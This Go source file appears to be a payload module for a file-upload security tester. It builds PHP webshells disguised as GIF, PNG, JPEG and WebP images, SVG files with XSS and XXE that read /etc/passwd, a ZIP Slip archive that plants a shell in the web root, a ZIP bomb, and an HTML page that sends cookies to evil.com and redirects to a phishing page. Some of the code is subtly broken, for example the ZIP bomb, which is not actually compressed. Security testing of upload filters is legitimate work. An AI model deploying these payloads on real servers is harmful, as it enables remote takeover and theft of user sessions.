package payload

import (
	"bytes"
)

// moduleF generates Polyglot File, Archive, and Format-Specific attack payloads.
// Tests for GIF+PHP polyglots, ZIP archives with webshells,
// SVG with XSS, and other format-based filter bypasses.
func moduleF() []*Payload {
	var tests []*Payload

	// F1: GIF+PHP Polyglot (valid GIF + executable PHP)
	gifHeader := []byte("GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!")
	gifTrailer := []byte("\x00\x3B")

	gifPHPPolyglot := make([]byte, 0)
	gifPHPPolyglot = append(gifPHPPolyglot, gifHeader...)
	gifPHPPolyglot = append(gifPHPPolyglot, []byte("\n<?php system($_GET['cmd']); __halt_compiler();?>\n")...)
	gifPHPPolyglot = append(gifPHPPolyglot, gifTrailer...)

	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "GIF+PHP Polyglot (valid GIF + executable PHP webshell)",
		Filename:  "polyglot_gifphp.gif",
		Extension: ".gif",
		Body:      gifPHPPolyglot,
		Tags:      []string{"polyglot", "gif", "php", "magic-bytes"},
	})

	// F2: PNG+PHP Polyglot
	pngHeader := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}
	pngPHPPolyglot := make([]byte, 0)
	pngPHPPolyglot = append(pngPHPPolyglot, pngHeader...)
	pngPHPPolyglot = append(pngPHPPolyglot, []byte("\n<?php system($_GET['cmd']); __halt_compiler();?>\n")...)

	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "PNG+PHP Polyglot (PNG header + PHP webshell)",
		Filename:  "polyglot_pngphp.png",
		Extension: ".png",
		Body:      pngPHPPolyglot,
		Tags:      []string{"polyglot", "png", "php", "magic-bytes"},
	})

	// F3: JPEG+PHP Polyglot
	jpegHeader := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01}
	jpegPHPPolyglot := make([]byte, 0)
	jpegPHPPolyglot = append(jpegPHPPolyglot, jpegHeader...)
	jpegPHPPolyglot = append(jpegPHPPolyglot, []byte("\n<?php system($_GET['cmd']); __halt_compiler();?>\n")...)

	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "JPEG+PHP Polyglot (JPEG header + PHP webshell)",
		Filename:  "polyglot_jpegphp.jpg",
		Extension: ".jpg",
		Body:      jpegPHPPolyglot,
		Tags:      []string{"polyglot", "jpeg", "php", "magic-bytes"},
	})

	// F4: GIF+PHP+JavaScript Polyglot (triple threat!)
	gifJSPHPPolyglot := []byte(`GIF89a/*<?php system($_GET['cmd']); __halt_compiler();?>*/
<script>alert('XSS via polyglot GIF')</script>
*/=1
`)

	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "GIF+PHP+JS Polyglot (triple format: GIF image, PHP shell, XSS payload)",
		Filename:  "triple_polyglot.gif",
		Extension: ".gif",
		Body:      gifJSPHPPolyglot,
		Tags:      []string{"polyglot", "gif", "php", "javascript", "xss"},
	})

	// F5: SVG with XSS/XXE attacks
	svgXSS := []byte(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <script type="text/javascript">
    alert('XSS via SVG file upload - Cookie: ' + document.cookie);
  </script>
  <image xlink:href="http://evil.com/steal?cookie=" + document.cookie width="200" height="200"/>
  <circle cx="100" cy="100" r="80" fill="red"/>
  <text x="50" y="50" fill="white">XSS Test</text>
</svg>`)

	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "SVG file with embedded XSS (stored XSS via file upload)",
		Filename:  "xss_vector.svg",
		Extension: ".svg",
		Body:      svgXSS,
		Tags:      []string{"svg", "xss", "stored-xss", "image-upload"},
	})

	// SVG with XXE
	svgXXE := []byte(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>`)

	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "SVG file with XXE (XML External Entity - reads /etc/passwd)",
		Filename:  "xxe_attack.svg",
		Extension: ".svg",
		Body:      svgXXE,
		Tags:      []string{"svg", "xxe", "file-read", "xml-attack"},
	})

	// F6: ZIP file with webshell inside (ZIP slip attack)
	zipPayload := createZIPWithPHPWebshell("../../../var/www/html/shell.php")
	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "ZIP file with PHP webshell using path traversal (ZIP Slip attack)",
		Filename:  "zip_slip_attack.zip",
		Extension: ".zip",
		Body:      zipPayload,
		Tags:      []string{"archive", "zip-slip", "path-traversal", "extraction-attack"},
	})

	// F7: Simple ZIP bomb (compressed DoS)
	zipBomb := createZIPBomb(1024 * 100) // 100KB -> expands to 100MB
	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "ZIP Bomb (100KB compressed -> 100MB uncompressed) - DoS test",
		Filename:  "zip_bomb.zip",
		Extension: ".zip",
		Body:      zipBomb,
		Tags:      []string{"archive", "zip-bomb", "dos", "compression-attack"},
	})

	// F8: PDF with embedded JavaScript/Launch action
	pdfPayload := []byte(`%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('XSS via PDF upload')) >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000125 00000 n
0000000192 00000 n
trailer
<< /Size 4 /Root 1 0 R >>
startxref
281
%%EOF`)

	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "PDF with embedded JavaScript (stored XSS via PDF upload)",
		Filename:  "malicious_document.pdf",
		Extension: ".pdf",
		Body:      pdfPayload,
		Tags:      []string{"pdf", "javascript", "xss", "document-attack"},
	})

	// F9: HTML file with iframe/redirect
	htmlPayload := []byte(`<!DOCTYPE html>
<html>
<head><title>Phishing via Upload</title></head>
<body>
  <h1>File Upload Security Test</h1>
  <script>
    // Cookie stealing
    var img = new Image();
    img.src = "https://evil.com/steal?cookie=" + document.cookie;
    // Redirect to phishing page
    window.location = "https://evil.com/phishing";
  </script>
  <iframe src="https://evil.com/malware" width="0" height="0"></iframe>
</body>
</html>`)

	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "HTML file with cookie stealing and phishing redirect",
		Filename:  "phishing_page.html",
		Extension: ".html",
		Body:      htmlPayload,
		Tags:      []string{"html", "phishing", "xss", "redirect"},
	})

	// F10: WebP/AVIF with polyglot payloads (modern image formats)
	webpPayload := createWebPPolyglot()
	tests = append(tests, &Payload{
		TestType:  TestTypePolyglotArchive, // 🚀 Fixed mapping
		Technique: "WebP image with PHP polyglot payload",
		Filename:  "polyglot_image.webp",
		Extension: ".webp",
		Body:      webpPayload,
		Tags:      []string{"polyglot", "webp", "modern-image", "bypass"},
	})

	return tests
}

// createZIPWithPHPWebshell creates a minimal ZIP file containing a PHP webshell
// with path traversal in the filename (ZIP Slip attack)
func createZIPWithPHPWebshell(targetPath string) []byte {
	filename := targetPath
	fileContent := phpWebshell

	// Local file header
	localHeader := []byte{0x50, 0x4B, 0x03, 0x04} // Signature
	localHeader = append(localHeader, []byte{0x14, 0x00}...) // Version needed
	localHeader = append(localHeader, []byte{0x00, 0x00}...) // General purpose flag
	localHeader = append(localHeader, []byte{0x00, 0x00}...) // Compression method (stored)
	localHeader = append(localHeader, []byte{0x00, 0x00, 0x00, 0x00}...) // Mod time/date
	crc32 := calculateCRC32(fileContent)
	localHeader = append(localHeader, crc32...)
	compressedSize := uint32ToBytes(uint32(len(fileContent)))
	localHeader = append(localHeader, compressedSize...)
	localHeader = append(localHeader, compressedSize...) // Uncompressed size
	filenameLen := uint16ToBytes(uint16(len(filename)))
	localHeader = append(localHeader, filenameLen...)
	localHeader = append(localHeader, []byte{0x00, 0x00}...) // Extra field length
	localHeader = append(localHeader, []byte(filename)...)
	localHeader = append(localHeader, fileContent...)

	// Central directory
	centralDir := []byte{0x50, 0x4B, 0x01, 0x02}
	centralDir = append(centralDir, []byte{0x14, 0x00, 0x14, 0x00}...)
	centralDir = append(centralDir, []byte{0x00, 0x00, 0x00, 0x00}...)
	centralDir = append(centralDir, []byte{0x00, 0x00, 0x00, 0x00}...)
	centralDir = append(centralDir, crc32...)
	centralDir = append(centralDir, compressedSize...)
	centralDir = append(centralDir, compressedSize...)
	centralDir = append(centralDir, filenameLen...)
	centralDir = append(centralDir, []byte{0x00, 0x00}...) // Extra field
	centralDir = append(centralDir, []byte{0x00, 0x00}...) // Comment length
	centralDir = append(centralDir, []byte{0x00, 0x00}...) // Disk number
	centralDir = append(centralDir, []byte{0x00, 0x00}...) // Internal attributes
	centralDir = append(centralDir, []byte{0x00, 0x00, 0x00, 0x00}...) // External attributes
	offset := uint32ToBytes(0)
	centralDir = append(centralDir, offset...)
	centralDir = append(centralDir, []byte(filename)...)

	// End of central directory
	endDir := []byte{0x50, 0x4B, 0x05, 0x06}
	endDir = append(endDir, []byte{0x00, 0x00}...) // Disk number
	endDir = append(endDir, []byte{0x00, 0x00}...) // Central dir disk
	endDir = append(endDir, []byte{0x01, 0x00}...) // Entries on disk
	endDir = append(endDir, []byte{0x01, 0x00}...) // Total entries
	centralDirSize := uint32ToBytes(uint32(len(centralDir)))
	endDir = append(endDir, centralDirSize...)
	centralDirOffset := uint32ToBytes(uint32(len(localHeader)))
	endDir = append(endDir, centralDirOffset...)
	endDir = append(endDir, []byte{0x00, 0x00}...) // Comment length

	// Combine all parts
	zip := make([]byte, 0)
	zip = append(zip, localHeader...)
	zip = append(zip, centralDir...)
	zip = append(zip, endDir...)

	return zip
}

// createZIPBomb creates a minimal ZIP bomb
func createZIPBomb(targetSize int) []byte {
	zeros := bytes.Repeat([]byte{0}, targetSize)

	zip := make([]byte, 0)
	zip = append(zip, 0x50, 0x4B, 0x03, 0x04) // Signature
	zip = append(zip, 0x14, 0x00) // Version
	zip = append(zip, 0x00, 0x00) // Flags
	zip = append(zip, 0x08, 0x00) // DEFLATE compression
	zip = append(zip, 0x00, 0x00, 0x00, 0x00) // Time/date
	zip = append(zip, 0x00, 0x00, 0x00, 0x00) // CRC32
	zip = append(zip, byte(len(zeros)), byte(len(zeros)>>8), 0x00, 0x00) // Compressed
	zip = append(zip, byte(targetSize), byte(targetSize>>8), 0x00, 0x00) // Uncompressed
	zip = append(zip, 0x08, 0x00) // Filename length
	zip = append(zip, 0x00, 0x00) // Extra
	zip = append(zip, []byte("zero.txt")...)
	zip = append(zip, zeros...)

	return zip
}

// createWebPPolyglot creates a WebP image with PHP payload
func createWebPPolyglot() []byte {
	webp := []byte("RIFF")
	webp = append(webp, []byte{0x00, 0x00, 0x00, 0x00}...) // Size placeholder
	webp = append(webp, []byte("WEBP")...)
	webp = append(webp, []byte("\n<?php system($_GET['cmd']); __halt_compiler();?>\n")...)
	return webp
}

// Helper functions for ZIP creation
func uint32ToBytes(v uint32) []byte {
	b := make([]byte, 4)
	b[0] = byte(v)
	b[1] = byte(v >> 8)
	b[2] = byte(v >> 16)
	b[3] = byte(v >> 24)
	return b
}

func uint16ToBytes(v uint16) []byte {
	b := make([]byte, 2)
	b[0] = byte(v)
	b[1] = byte(v >> 8)
	return b
}

func calculateCRC32(data []byte) []byte {
	crc := uint32(0xFFFFFFFF)
	for _, b := range data {
		crc ^= uint32(b)
		for i := 0; i < 8; i++ {
			if crc&1 != 0 {
				crc = (crc >> 1) ^ 0xEDB88320
			} else {
				crc >>= 1
			}
		}
	}
	crc ^= 0xFFFFFFFF
	return uint32ToBytes(crc)
}
